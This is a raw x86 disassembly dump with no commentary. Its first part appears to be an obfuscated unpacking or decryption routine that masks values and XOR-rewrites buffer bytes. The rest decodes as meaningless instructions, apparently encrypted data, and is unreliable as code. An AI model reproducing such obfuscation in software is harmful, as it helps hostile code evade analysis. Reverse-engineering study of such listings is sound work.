  4039fc:	and    DWORD PTR ds:0x428e27,0x4d72
  403a06:	xor    ecx,esi
  403a08:	xor    DWORD PTR ds:0x428ea3,0x741f
  403a12:	inc    eax
  403a13:	sub    DWORD PTR ds:0x428e37,0x428eb7
  403a1d:	inc    DWORD PTR [ebp-0x14]
  403a20:	add    ecx,edi
  403a22:	mov    DWORD PTR ds:0x428e47,0x2f68
  403a2c:	cmp    eax,ecx
  403a2e:	jb     0x40393c
  403a34:	and    DWORD PTR ds:0x428e9b,0x0
  403a3e:	mov    eax,ds:0x428e9b
  403a43:	inc    eax
  403a44:	mov    ds:0x428e9b,eax
  403a49:	cmp    DWORD PTR ds:0x428e9b,0xd
  403a50:	jb     0x403a8c
  403a56:	jmp    0x403a67
  403a5b:	push   DWORD PTR [ebp-0x18]
  403a5e:	push   DWORD PTR [ebp-0x1c]
  403a61:	call   DWORD PTR ds:0x42a9f3
  403a67:	cmp    DWORD PTR ds:0x428e9b,0xc
  403a6e:	jne    0x403a7f
  403a74:	mov    eax,ds:0x428e9b
  403a79:	inc    eax
  403a7a:	mov    ds:0x428e9b,eax
  403a7f:	cmp    DWORD PTR ds:0x428e9b,0x15
  403a86:	jb     0x403a3e
  403a8c:	mov    dl,BYTE PTR [ebp-0x21]
  403a8f:	xor    eax,0x61a1
  403a94:	mov    eax,DWORD PTR [ebp-0x34]
  403a97:	xor    al,0xaf
  403a99:	mov    cl,0xa
  403a9b:	sub    cl,al
  403a9d:	add    DWORD PTR ds:0x428ea3,0x32c3
  403aa7:	add    dl,cl
  403aa9:	sbb    ecx,DWORD PTR ds:0x428eb3
  403aaf:	mov    ecx,DWORD PTR [ebp-0x1c]
  403ab2:	sub    DWORD PTR ds:0x428ea7,0x428e8f
  403abc:	xor    cl,0xaf
  403abf:	sub    cl,0xa
  403ac2:	sub    DWORD PTR ds:0x428ea3,0x68fd
  403acc:	ror    dl,cl
  403ace:	sub    DWORD PTR ds:0x428e6b,ebx
  403ad4:	xor    eax,eax
  403ad6:	mov    eax,DWORD PTR [ebp-0xc]
  403ad9:	add    DWORD PTR ds:0x428e8f,ebx
  403adf:	mov    BYTE PTR [eax+ebx*1+0x800],dl
  403ae6:	mov    ecx,DWORD PTR ds:0x4292fb
  403aec:	mov    eax,ds:0x429787
  403af1:	sub    ecx,eax
  403af3:	and    ecx,DWORD PTR [ecx+eax*1]
  403af6:	mov    eax,DWORD PTR [ebp-0xc]
  403af9:	mov    DWORD PTR ds:0x428e33,0x15
  403b03:	cmp    DWORD PTR ds:0x428e33,0x0
  403b0a:	je     0x403b3f
  403b10:	cmp    DWORD PTR ds:0x428e33,0x25
  403b17:	jbe    0x403b3f
  403b1d:	jmp    0x403b2d
  403b22:	push   0x428e23
  403b27:	call   DWORD PTR ds:0x42a9f7
  403b2d:	mov    ecx,DWORD PTR ds:0x428e33
  403b33:	dec    ecx
  403b34:	mov    DWORD PTR ds:0x428e33,ecx
  403b3a:	jmp    0x403b03
  403b3f:	mov    ecx,DWORD PTR [ebp-0x28]
  403b42:	neg    DWORD PTR ds:0x428e5b
  403b48:	sub    eax,edi
  403b4a:	sub    DWORD PTR ds:0x428e8b,0x4b02
  403b54:	xor    eax,esi
  403b56:	mov    DWORD PTR ds:0x428ec7,0x6067
  403b60:	cmp    eax,ecx
  403b62:	jne    0x403b8c
  403b68:	mov    eax,DWORD PTR [ebp-0x8]
  403b6b:	mov    ecx,DWORD PTR [ebp-0x10]
  403b6e:	xor    eax,esi
  403b70:	xor    ecx,esi
  403b72:	sub    eax,ecx
  403b74:	sub    eax,edi
  403b76:	xor    eax,esi
  403b78:	mov    DWORD PTR [ebp-0x8],eax
  403b7b:	mov    eax,DWORD PTR [ebp-0x10]
  403b7e:	xor    eax,esi
  403b80:	mov    ecx,0xffcd8d8a
  403b85:	sub    ecx,eax
  403b87:	jmp    0x403b9b
  403b8c:	mov    eax,DWORD PTR [ebp-0x10]
  403b8f:	xor    eax,esi
  403b91:	mov    ecx,0xffcd8d0a
  403b96:	sub    ecx,eax
  403b98:	add    ecx,DWORD PTR [ebp-0xc]
  403b9b:	mov    DWORD PTR [ebp-0xc],ecx
  403b9e:	mov    eax,DWORD PTR [ebp-0x8]
  403ba1:	cmp    eax,0xf89c85a5
  403ba6:	jne    0x403815
  403bac:	mov    DWORD PTR [ebp-0x34],0x9
  403bb3:	mov    ecx,DWORD PTR [ebp+0x8]
  403bb6:	xor    ecx,esi
  403bb8:	add    ecx,edi
  403bba:	jmp    0x403e1a
  403bbf:	lea    eax,[ecx+ebx*1]
  403bc2:	mov    DWORD PTR [ebp-0x2c],eax
  403bc5:	mov    eax,DWORD PTR [ebp-0x58]
  403bc8:	sub    eax,ecx
  403bca:	mov    DWORD PTR [ebp-0x1c],eax
  403bcd:	mov    eax,DWORD PTR [ebp-0x1c]
  403bd0:	mov    DWORD PTR [ebp-0x14],eax
  403bd3:	mov    eax,DWORD PTR [ebp-0x2c]
  403bd6:	mov    DWORD PTR [ebp-0x38],0xf89c85a5
  403bdd:	mov    DWORD PTR [ebp-0x54],eax
  403be0:	mov    DWORD PTR [ebp-0x20],0xf89c85a4
  403be7:	mov    eax,DWORD PTR [ebp-0x38]
  403bea:	xor    eax,esi
  403bec:	add    eax,edi
  403bee:	mov    DWORD PTR [ebp-0x10],eax
  403bf1:	mov    eax,DWORD PTR [ebp-0x38]
  403bf4:	xor    eax,esi
  403bf6:	add    eax,edi
  403bf8:	mov    DWORD PTR [ebp-0x8],eax
  403bfb:	mov    DWORD PTR [ebp-0x2c],0xf89c8585
  403c02:	mov    DWORD PTR [ebp-0x44],0xf89c85be
  403c09:	mov    eax,DWORD PTR [ebp-0x38]
  403c0c:	mov    edx,DWORD PTR [ebp-0x14]
  403c0f:	xor    eax,esi
  403c11:	add    eax,edi
  403c13:	cmp    edx,eax
  403c15:	je     0x403e0e
  403c1b:	mov    eax,DWORD PTR [ebp-0x20]
  403c1e:	xor    eax,esi
  403c20:	mov    edx,0xffcd8d0a
  403c25:	sub    edx,eax
  403c27:	add    edx,DWORD PTR [ebp-0x14]
  403c2a:	mov    eax,DWORD PTR [ebp-0x20]
  403c2d:	mov    ebx,DWORD PTR [ebp-0x10]
  403c30:	xor    eax,esi
  403c32:	add    eax,edi
  403c34:	imul   eax,ebx
  403c37:	cmp    eax,edx
  403c39:	ja     0x403e0b
  403c3f:	mov    edx,DWORD PTR [ebp-0x10]
  403c42:	mov    eax,DWORD PTR [ebp-0x14]
  403c45:	mov    ebx,DWORD PTR [ebp-0x2c]
  403c48:	sub    eax,edx
  403c4a:	xor    ebx,esi
  403c4c:	xor    edx,edx
  403c4e:	add    ebx,edi
  403c50:	div    ebx
  403c52:	mov    DWORD PTR [ebp-0x8],eax
  403c55:	mov    eax,DWORD PTR [ebp-0x44]
  403c58:	mov    edx,DWORD PTR [ebp-0x8]
  403c5b:	xor    eax,esi
  403c5d:	add    eax,edi
  403c5f:	cmp    edx,eax
  403c61:	jbe    0x403c71
  403c67:	mov    eax,DWORD PTR [ebp-0x44]
  403c6a:	xor    eax,esi
  403c6c:	add    eax,edi
  403c6e:	mov    DWORD PTR [ebp-0x8],eax
  403c71:	mov    eax,DWORD PTR [ebp-0x2c]
  403c74:	mov    edx,DWORD PTR [ebp-0x8]
  403c77:	xor    eax,esi
  403c79:	add    eax,edi
  403c7b:	imul   eax,edx
  403c7e:	mov    DWORD PTR [ebp-0x8],eax
  403c81:	mov    eax,DWORD PTR [ebp-0x38]
  403c84:	mov    edx,DWORD PTR [ebp-0x8]
  403c87:	xor    eax,esi
  403c89:	add    eax,edi
  403c8b:	cmp    edx,eax
  403c8d:	je     0x403df4
  403c93:	mov    eax,DWORD PTR [ebp-0x8]
  403c96:	mov    DWORD PTR [ebp-0x18],eax
  403c99:	mov    eax,DWORD PTR [ebp-0x10]
  403c9c:	add    eax,DWORD PTR [ebp-0x54]
  403c9f:	mov    DWORD PTR [ebp-0x1c],0xf89c85a5
  403ca6:	mov    DWORD PTR [ebp-0x8],eax
  403ca9:	mov    eax,0xf89c85a4
  403cae:	mov    DWORD PTR [ebp-0x28],eax
  403cb1:	mov    DWORD PTR [ebp-0x5c],0xf89c85a3
  403cb8:	mov    DWORD PTR [ebp-0x40],0xf89c85a2
  403cbf:	mov    DWORD PTR [ebp-0x30],eax
  403cc2:	mov    eax,DWORD PTR [ebp-0x1c]
  403cc5:	xor    eax,esi
  403cc7:	add    eax,edi
  403cc9:	jmp    0x403db0
  403cce:	mov    DWORD PTR [ebp-0x4c],0xf89c85ba
  403cd5:	mov    DWORD PTR [ebp-0x50],0xf89c858f
  403cdc:	mov    eax,DWORD PTR [ebp-0x30]
  403cdf:	mov    edx,DWORD PTR [ebp-0xc]
  403ce2:	xor    eax,esi
  403ce4:	add    eax,edi
  403ce6:	imul   eax,edx
  403ce9:	mov    edx,DWORD PTR [ebp-0x8]
  403cec:	mov    al,BYTE PTR [eax+edx*1]
  403cef:	mov    BYTE PTR [ebp-0x1],al
  403cf2:	mov    eax,DWORD PTR [ebp-0x30]
  403cf5:	mov    edx,DWORD PTR [ebp-0xc]
  403cf8:	xor    eax,esi
  403cfa:	add    eax,edi
  403cfc:	imul   eax,edx
  403cff:	mov    edx,DWORD PTR [ebp-0x5c]
  403d02:	xor    edx,esi
  403d04:	add    eax,edx
  403d06:	mov    edx,DWORD PTR [ebp-0x8]
  403d09:	movzx  eax,BYTE PTR [eax+edx*1+0x3272f6]
  403d11:	mov    edx,DWORD PTR [ebp-0x4c]
  403d14:	xor    edx,esi
  403d16:	lea    eax,[edx+eax*1+0x3272f6]
  403d1d:	movzx  edx,BYTE PTR [ebp-0x1]
  403d21:	xor    edx,eax
  403d23:	mov    BYTE PTR [ebp-0x1],dl
  403d26:	mov    al,BYTE PTR [ebp-0x1]
  403d29:	mov    edx,DWORD PTR [ebp-0x30]
  403d2c:	mov    ebx,DWORD PTR [ebp-0xc]
  403d2f:	xor    edx,esi
  403d31:	add    edx,edi
  403d33:	imul   edx,ebx
  403d36:	mov    ebx,DWORD PTR [ebp-0x8]
  403d39:	mov    BYTE PTR [edx+ebx*1],al
  403d3c:	mov    eax,DWORD PTR [ebp-0x30]
  403d3f:	mov    edx,DWORD PTR [ebp-0xc]
  403d42:	xor    eax,esi
  403d44:	add    eax,edi
  403d46:	imul   eax,edx
  403d49:	mov    edx,DWORD PTR [ebp-0x8]
  403d4c:	mov    al,BYTE PTR [eax+edx*1]
  403d4f:	mov    BYTE PTR [ebp-0x1],al
  403d52:	mov    eax,DWORD PTR [ebp-0x30]
  403d55:	mov    edx,DWORD PTR [ebp-0xc]
  403d58:	xor    eax,esi
  403d5a:	add    eax,edi
  403d5c:	imul   eax,edx
  403d5f:	mov    edx,DWORD PTR [ebp-0x28]
  403d62:	xor    edx,esi
  403d64:	add    eax,edx
  403d66:	mov    edx,DWORD PTR [ebp-0x8]
  403d69:	movzx  eax,BYTE PTR [eax+edx*1+0x3272f6]
  403d71:	mov    edx,DWORD PTR [ebp-0x50]
  403d74:	xor    edx,esi
  403d76:	lea    eax,[edx+eax*1+0x3272f6]
  403d7d:	movzx  edx,BYTE PTR [ebp-0x1]
  403d81:	xor    edx,eax
  403d83:	mov    BYTE PTR [ebp-0x1],dl
  403d86:	mov    al,BYTE PTR [ebp-0x1]
  403d89:	mov    edx,DWORD PTR [ebp-0x30]
  403d8c:	mov    ebx,DWORD PTR [ebp-0xc]
  403d8f:	xor    edx,esi
  403d91:	add    edx,edi
  403d93:	imul   edx,ebx
  403d96:	mov    ebx,DWORD PTR [ebp-0x8]
  403d99:	mov    BYTE PTR [edx+ebx*1],al
  403d9c:	mov    eax,DWORD PTR [ebp-0x40]
  403d9f:	mov    edx,DWORD PTR [ebp-0x28]
  403da2:	xor    eax,esi
  403da4:	xor    edx,esi
  403da6:	add    eax,edi
  403da8:	add    edx,edi
  403daa:	imul   eax,edx
  403dad:	add    eax,DWORD PTR [ebp-0xc]
  403db0:	mov    DWORD PTR [ebp-0xc],eax
  403db3:	mov    eax,DWORD PTR [ebp-0xc]
  403db6:	mov    edx,DWORD PTR [ebp-0x18]
  403db9:	cmp    edx,eax
  403dbb:	jb     0x403cce
  403dc1:	mov    eax,DWORD PTR [ebp-0x28]
  403dc4:	mov    edx,DWORD PTR [ebp-0x18]
  403dc7:	xor    eax,esi
  403dc9:	add    eax,edi
  403dcb:	imul   eax,edx
  403dce:	mov    edx,DWORD PTR [ebp-0x1c]
  403dd1:	xor    edx,esi
  403dd3:	add    edx,edi
  403dd5:	or     eax,edx
  403dd7:	mov    edx,DWORD PTR [ebp-0x20]
  403dda:	xor    edx,esi
  403ddc:	add    eax,edx
  403dde:	mov    edx,DWORD PTR [ebp-0x20]
  403de1:	xor    edx,esi
  403de3:	add    eax,edx
  403de5:	mov    edx,DWORD PTR [ebp-0x10]
  403de8:	lea    eax,[eax+edx*1+0x64e5ec]
  403def:	jmp    0x403e03
  403df4:	mov    eax,DWORD PTR [ebp-0x20]
  403df7:	mov    edx,DWORD PTR [ebp-0x10]
  403dfa:	xor    eax,esi
  403dfc:	lea    eax,[eax+edx*1+0x3272f6]
  403e03:	mov    DWORD PTR [ebp-0x10],eax
  403e06:	jmp    0x403c1b
  403e0b:	mov    ebx,DWORD PTR [ebp-0x3c]
  403e0e:	mov    eax,DWORD PTR [ebp+0xc]
  403e11:	xor    eax,esi
  403e13:	lea    ecx,[ecx+eax*1+0x3272f6]
  403e1a:	lea    eax,[ecx-0x3272f6]
  403e20:	xor    eax,esi
  403e22:	cmp    eax,0xf89c95a5
  403e27:	jne    0x403bbf
  403e2d:	dec    DWORD PTR [ebp-0x34]
  403e30:	jne    0x403bb3
  403e36:	mov    eax,DWORD PTR [ebp+0x8]
  403e39:	mov    ecx,DWORD PTR [ebp+0xc]
  403e3c:	mov    edx,DWORD PTR [ebp+0x8]
  403e3f:	xor    ecx,esi
  403e41:	mov    cl,BYTE PTR [ecx+ebx*1+0x3272f6]
  403e48:	xor    eax,esi
  403e4a:	mov    al,BYTE PTR [eax+ebx*1+0x3272f6]
  403e51:	xor    edx,esi
  403e53:	mov    BYTE PTR [edx+ebx*1+0x3272f6],cl
  403e5a:	mov    ecx,DWORD PTR [ebp+0xc]
  403e5d:	xor    ecx,esi
  403e5f:	jmp    0x4061b8
  403e64:	outs   dx,BYTE PTR ds:[esi]
  403e65:	pop    edi
  403e66:	or     al,BYTE PTR [bp+0xa]
  403e6a:	push   cs
  403e6b:	pop    ss
  403e6c:	xor    edx,esi
  403e6e:	cld    
  403e6f:	fwait
  403e70:	dec    edx
  403e71:	outs   dx,DWORD PTR ds:[esi]
  403e72:	call   0x4783:0x836047ec
  403e79:	pusha  
  403e7a:	add    DWORD PTR [ebx-0x5fd77a6f],0xffffff95
  403e81:	out    0x93,eax
  403e83:	mov    ds:0x5d634c4c,al
  403e88:	jnp    0x403ee3
  403e8a:	sbb    eax,0x213160c
  403e8f:	ret    
  403e90:	push   edi
  403e91:	loope  0x403eba
  403e93:	cwde   
  403e94:	(bad)  
  403e95:	fs add cl,al
  403e98:	pop    edx
  403e99:	push   ebp
  403e9a:	inc    edx
  403e9b:	imul   edi,DWORD PTR [edi+0x3418751f],0x53
  403ea2:	or     DWORD PTR [eax+0x190e5f52],ebx
  403ea8:	cmp    DWORD PTR [esi+0x1f4c6f0],0x2834235c
  403eb2:	int3   
  403eb3:	out    dx,al
  403eb4:	daa    
  403eb5:	xlat   BYTE PTR ds:[ebx]
  403eb6:	dec    edx
  403eb7:	mov    eax,ds:0x369ad641
  403ebc:	inc    esp
  403ebd:	xchg   edx,eax
  403ebe:	mov    bl,0xde
  403ec0:	out    0x2f,eax
  403ec2:	or     dh,BYTE PTR [edx+0x2f]
  403ec5:	dec    edi
  403ec6:	sub    DWORD PTR [ebp+0x7a],esp
  403ec9:	cdq    
  403eca:	add    eax,0x78e997c2
  403ecf:	sahf   
  403ed0:	mov    esp,DWORD PTR [ecx+0x23]
  403ed3:	push   esi
  403ed4:	inc    esp
  403ed5:	imul   ecx,DWORD PTR [edx-0x60],0x2b
  403ed9:	xor    bh,BYTE PTR [edx]
  403edb:	pushf  
  403edc:	sub    DWORD PTR [ecx+0x8],edx
  403edf:	fisubr DWORD PTR [edx+0x4c0634d8]
  403ee5:	sbb    BYTE PTR [esi+0x3f],0x77
  403ee9:	add    al,0x3
  403eeb:	arpl   WORD PTR [esi-0x4fd4ea8a],ax
  403ef1:	stos   DWORD PTR es:[edi],eax
  403ef2:	or     BYTE PTR [esi+0x74a8f790],cl
  403ef8:	icebp  
  403ef9:	in     al,dx
  403efa:	pop    esp
  403efb:	popa   
  403efc:	mov    edi,0xe0079549
  403f01:	sub    dh,bh
  403f03:	push   edi
  403f04:	jp     0x403f84
  403f06:	not    BYTE PTR [eax+eiz*1-0x2c]
  403f0a:	mov    bl,0x3c
  403f0c:	add    eax,0xcbe6cddc
  403f11:	add    BYTE PTR [edi+0x1c147c81],0x76
  403f18:	cld    
  403f19:	int    0x8f
  403f1b:	push   0x6bf4cbe0
  403f20:	cld    
  403f21:	xchg   esp,eax
  403f22:	fist   WORD PTR [edi]
  403f24:	sahf   
  403f25:	mov    esp,0xd19af939
  403f2a:	stc    
  403f2b:	mov    bh,0x49
  403f2d:	dec    ebp
  403f2e:	(bad)  
  403f2f:	call   FWORD PTR [edi-0x1c]
  403f32:	call   0x1639:0xedb90aa8
  403f39:	push   0xc2ac0c3f
  403f3e:	stc    
  403f3f:	pop    es
  403f40:	in     eax,0x72
  403f42:	test   BYTE PTR [ebx],ah
  403f44:	add    DWORD PTR [eax+0x373f308d],ebx
  403f4a:	aas    
  403f4b:	and    al,0x6e
  403f4d:	push   ebx
  403f4e:	xor    al,0x20
  403f50:	popf   
  403f51:	push   cs
  403f52:	pusha  
  403f53:	fs icebp 
  403f55:	xchg   ebp,eax
  403f56:	pop    edi
  403f57:	xlat   BYTE PTR ds:[ebx]
  403f58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403f59:	aam    0x96
  403f5b:	and    esp,DWORD PTR [esi+edx*4+0x6edca079]
  403f62:	mov    dl,0xd0
  403f64:	xchg   edi,eax
  403f65:	sbb    BYTE PTR [ebx+0x6ee68f3e],bl
  403f6b:	push   esp
  403f6c:	jnp    0x403f22
  403f6e:	push   esp
  403f6f:	scas   al,BYTE PTR es:[edi]
  403f70:	push   edi
  403f71:	mov    ds:0x2c12ddba,eax
  403f76:	inc    ebx
  403f77:	rcl    BYTE PTR [ebx+0x29],1
  403f7a:	aaa    
  403f7b:	push   edx
  403f7c:	jg     0x403f62
  403f7e:	push   cs
  403f7f:	jmp    0x403fce
  403f81:	push   0xd3a3462f
  403f86:	jo     0x403f40
  403f88:	call   0x2f2cdd3
  403f8d:	adc    al,0xe7
  403f8f:	mov    eax,DWORD PTR [ebp+0x59fa21d]
  403f95:	or     BYTE PTR [esi+0x7b],cl
  403f98:	jge    0x403ffc
  403f9a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403f9b:	push   0x8c62c770
  403fa0:	mov    dl,0x5
  403fa2:	add    DWORD PTR [ecx+0x6ebc4d59],eax
  403fa8:	fmul   DWORD PTR [ebx]
  403faa:	jge    0x404027
  403fac:	fadd   st(4),st
  403fae:	sub    dh,dh
  403fb0:	mov    esi,0xdbd6e0d8
  403fb5:	scas   eax,DWORD PTR es:[edi]
  403fb6:	inc    edx
  403fb7:	jg     0x40400c
  403fb9:	jns    0x403ff1
  403fbb:	std    
  403fbc:	out    dx,al
  403fbd:	jg     0x403fdf
  403fbf:	(bad)  
  403fc0:	mov    esp,0x45b42312
  403fc5:	retf   0xb7f4
  403fc8:	add    edi,edx
  403fca:	(bad)
  403fcd:	mov    BYTE PTR [ecx+0x20a0ff4f],bl
  403fd3:	inc    ebx
  403fd4:	jmp    0x47142d49
  403fd9:	add    eax,0xafa25aeb
  403fde:	cmp    BYTE PTR [edx-0x66],bh
  403fe1:	cwde   
  403fe2:	aad    0xbb
  403fe4:	mov    dh,0xf5
  403fe6:	ret    0x91fe
  403fe9:	adc    esi,ebp
  403feb:	shr    BYTE PTR [ecx+eax*8+0x17d21b03],1
  403ff2:	ja     0x40402e
  403ff4:	out    dx,eax
  403ff5:	lahf   
  403ff6:	xchg   ebx,eax
  403ff7:	xchg   ebx,eax
  403ff8:	inc    eax
  403ff9:	or     dl,ch
  403ffb:	mov    DWORD PTR [ecx+edx*4+0x7a35c79c],edi
  404002:	add    dh,BYTE PTR [eax-0x19]
  404005:	dec    ecx
  404006:	cmp    eax,0x9fe27413
  40400b:	push   ecx
  40400c:	add    eax,0x8724903a
  404011:	cmp    BYTE PTR [esi],ah
  404013:	jge    0x404006
  404015:	or     ch,BYTE PTR [edx+0x173ecff8]
  40401b:	or     al,0xde
  40401d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40401e:	jecxz  0x404008
  404020:	loope  0x404017
  404022:	jns    0x40404e
  404024:	popf   
  404025:	fstp   QWORD PTR [esi]
  404027:	(bad)  
  404028:	jo     0x40401e
  40402a:	(bad)  
  40402b:	jmp    0x403ffb
  40402d:	xchg   esp,eax
  40402e:	xchg   esi,eax
  40402f:	cli    
  404030:	add    BYTE PTR [edx],dl
  404032:	sbb    DWORD PTR [ebx],edi
  404034:	out    dx,eax
  404035:	or     al,0x1a
  404037:	adc    eax,0x1a50e5eb
  40403c:	cmp    eax,0x8db9480c
  404041:	jl     0x404073
  404043:	in     al,dx
  404044:	cmp    eax,0x6a9395b1
  404049:	aam    0x54
  40404b:	inc    esp
  40404c:	sub    BYTE PTR gs:[ecx+0x27317050],bl
  404053:	mov    al,0x66
  404055:	scas   al,BYTE PTR es:[edi]
  404056:	fmul   QWORD PTR [ebx]
  404058:	aad    0x3f
  40405a:	mov    eax,ds:0x1960eb66
  40405f:	ror    BYTE PTR [eax],cl
  404061:	das    
  404062:	pop    ss
  404063:	mov    ch,0x4
  404065:	std    
  404066:	imul   edi,eax,0x10a990ca
  40406c:	and    eax,0x4c089425
  404071:	mov    ch,0x69
  404073:	xchg   edi,eax
  404074:	or     ebp,esi
  404076:	shld   DWORD PTR [ebp+ebp*2-0x29],eax,0x9b
  40407c:	ret    0xe6ad
  40407f:	push   0xffffffa1
  404081:	ss retf 
  404083:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404084:	nop
  404085:	add    eax,0x4203184f
  40408a:	sub    dh,BYTE PTR ds:0xea9ed54e
  404090:	out    0xcd,eax
  404092:	lods   eax,DWORD PTR ds:[esi]
  404093:	sub    cl,BYTE PTR [edi-0x4c]
  404096:	es jb  0x4040c9
  404099:	lahf   
  40409a:	mov    DWORD PTR [ebx],esp
  40409c:	int    0xe0
  40409e:	add    esi,DWORD PTR [edx+0x466176d0]
  4040a4:	popf   
  4040a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4040a6:	sti    
  4040a7:	sub    BYTE PTR [ebp+0x59],ah
  4040aa:	aas    
  4040ab:	add    BYTE PTR ds:0xd15e3d78,bh
  4040b1:	rcr    DWORD PTR [ebx+ebp*8+0x4bc88938],1
  4040b8:	into   
  4040b9:	neg    DWORD PTR [eax+edi*2]
  4040bc:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  4040be:	add    eax,0x2891289d
  4040c3:	add    BYTE PTR [edx-0x54],cl
  4040c6:	pop    es
  4040c7:	mov    al,ds:0xe01f92c0
  4040cc:	push   ebp
  4040cd:	cld    
  4040ce:	sbb    BYTE PTR [eax-0x21442ce],ch
  4040d4:	test   eax,0xfc858405
  4040d9:	add    DWORD PTR [esp+ecx*1+0x59e33c16],eax
  4040e0:	mov    ebp,0x3330b31f
  4040e5:	test   al,0x50
  4040e7:	xchg   ebp,eax
  4040e8:	mov    ch,0x83
  4040ea:	inc    ebx
  4040eb:	mov    dl,0x5f
  4040ed:	in     al,0x9
  4040ef:	push   esp
  4040f0:	and    DWORD PTR [ebp-0x1eabe158],esi
  4040f6:	shl    BYTE PTR [ebx+0x64],1
  4040f9:	neg    DWORD PTR [edx-0xe]
  4040fc:	sahf   
  4040fd:	das    
  4040fe:	mov    cl,0x39
  404100:	fs mov dh,0x26
  404103:	imul   edi,edi,0x24f77741
  404109:	pop    es
  40410a:	sub    al,0xe6
  40410c:	jns    0x40409b
  40410e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40410f:	jl     0x404134
  404111:	into   
  404112:	jmp    0x81ec:0x3bee67f2
  404119:	leave  
  40411a:	pop    edx
  40411b:	dec    eax
  40411c:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  40411e:	(bad)  
  40411f:	mov    eax,0x2ec81bfd
  404124:	xchg   esi,eax
  404125:	mov    al,ds:0x769fa56f
  40412a:	mov    dl,0x12
  40412c:	jae    0x404177
  40412e:	dec    esp
  40412f:	adc    DWORD PTR [edx],edi
  404131:	aad    0x9d
  404133:	or     al,0x98
  404135:	mov    ebx,0x5db8d948
  40413a:	adc    eax,edi
  40413c:	cmp    DWORD PTR [ebp-0x2ad81bf4],ebx
  404142:	(bad)  
  404143:	in     eax,0x6a
  404145:	or     BYTE PTR [edx-0x2d],bl
  404148:	mov    ds:0x6f83f953,eax
  40414d:	ret    
  40414e:	aad    0x82
  404150:	shl    esi,1
  404152:	cmp    esi,DWORD PTR [ebp+0x18]
  404155:	lahf   
  404156:	lods   al,BYTE PTR ds:[esi]
  404157:	sub    DWORD PTR [ebx],edx
  404159:	mov    ?,WORD PTR [ebx]
  40415b:	fs in  eax,0xed
  40415e:	push   esi
  40415f:	push   cs
  404160:	retf   
  404161:	mov    bl,0x46
  404163:	add    al,0x55
  404165:	and    ecx,eax
  404167:	jle    0x4041a0
  404169:	mov    ebx,0xad55960b
  40416e:	lahf   
  40416f:	pop    esi
  404170:	lock call 0x2734:0xbf50605f
  404178:	out    0xaf,al
  40417a:	outs   dx,DWORD PTR ds:[esi]
  40417b:	test   al,0xe
  40417d:	adc    cl,bl
  40417f:	and    DWORD PTR [edx],edx
  404181:	cmp    al,0x8
  404183:	mov    eax,0x3a5ed0d6
  404188:	jmp    0x9124b1fc
  40418d:	jmp    0x972c:0xd74470d3
  404194:	icebp  
  404195:	push   es
  404196:	loope  0x40411a
  404198:	sbb    al,0x5a
  40419a:	shr    edx,cl
  40419c:	adc    ecx,ebx
  40419e:	cs cdq 
  4041a0:	inc    eax
  4041a1:	not    ebx
  4041a3:	xchg   BYTE PTR [eax-0x1987df6f],dh
  4041a9:	lods   al,BYTE PTR ds:[esi]
  4041aa:	jp     0x40419a
  4041ac:	outs   dx,BYTE PTR ds:[esi]
  4041ad:	pop    ds
  4041ae:	sbb    eax,0xb1924f61
  4041b3:	call   0xe0e03789
  4041b8:	and    al,0xed
  4041ba:	loop   0x40414c
  4041bc:	ret    0x56cc
  4041bf:	pop    ds
  4041c0:	ss (bad) 
  4041c3:	sub    edi,eax
  4041c5:	cs xchg ecx,eax
  4041c7:	addr16 cmc 
  4041c9:	jne    0x404184
  4041cb:	je     0x404241
  4041cd:	inc    eax
  4041ce:	xor    eax,0x5184bc23
  4041d3:	cld    
  4041d4:	xor    eax,0xe1b86e9e
  4041d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4041da:	pop    esi
  4041db:	or     ah,al
  4041dd:	mov    es,WORD PTR [ecx-0x5de191e2]
  4041e3:	stos   BYTE PTR es:[edi],al
  4041e4:	sub    al,0xf3
  4041e6:	les    ebp,FWORD PTR [eax-0x4a]
  4041e9:	xchg   ebp,eax
  4041ea:	out    0x6,eax
  4041ec:	mov    al,0x2b
  4041ee:	sbb    al,0xbb
  4041f0:	xor    esi,edi
  4041f2:	sti    
  4041f3:	sbb    eax,0x1bc51169
  4041f8:	xor    al,0x44
  4041fa:	popf   
  4041fb:	daa    
  4041fc:	dec    edi
  4041fd:	inc    edx
  4041fe:	or     eax,0x58d0f81f
  404203:	adc    al,BYTE PTR [esi-0x24]
  404206:	xchg   ecx,eax
  404207:	fdiv   st(0),st
  404209:	jb     0x404237
  40420b:	inc    esp
  40420c:	jae    0x404225
  40420e:	sbb    al,al
  404210:	idiv   DWORD PTR [edi+0x8]
  404213:	adc    eax,0x920ee9e7
  404218:	pop    ss
  404219:	pop    es
  40421a:	sbb    BYTE PTR [eax-0x15],al
  40421d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40421e:	shl    BYTE PTR [edx-0x4d],0xca
  404222:	call   0x4bc8:0x4e143550
  404229:	aam    0x22
  40422b:	lahf   
  40422c:	das    
  40422d:	cli    
  40422e:	ror    BYTE PTR [edx],cl
  404230:	mov    ecx,0x9801528c
  404235:	jne    0x4041f9
  404237:	lods   al,BYTE PTR ds:[esi]
  404238:	stc    
  404239:	mov    ds:0xf5411e4c,eax
  40423e:	sbb    edi,eax
  404240:	fnstsw WORD PTR [ebx-0x66386a8c]
  404246:	jmp    0xa47e0c71
  40424b:	ins    DWORD PTR es:[edi],dx
  40424c:	mov    ch,0x3b
  40424e:	and    DWORD PTR [eax+0x49eb13e0],ebx
  404254:	fwait
  404255:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404256:	arpl   WORD PTR [esi],bp
  404258:	and    DWORD PTR [edx-0x1d],0x61f2915b
  40425f:	push   es
  404260:	loop   0x4042bd
  404262:	mov    eax,0x3476c089
  404267:	out    0xdb,eax
  404269:	out    0xb0,eax
  40426b:	ins    DWORD PTR es:[edi],dx
  40426c:	dec    ebx
  40426d:	fstp   QWORD PTR ds:0x57199b33
  404273:	mov    edi,DWORD PTR [ecx]
  404275:	sbb    ebp,DWORD PTR ds:0xa257ad6e
  40427b:	retf   
  40427c:	(bad)  
  40427d:	scas   al,BYTE PTR es:[edi]
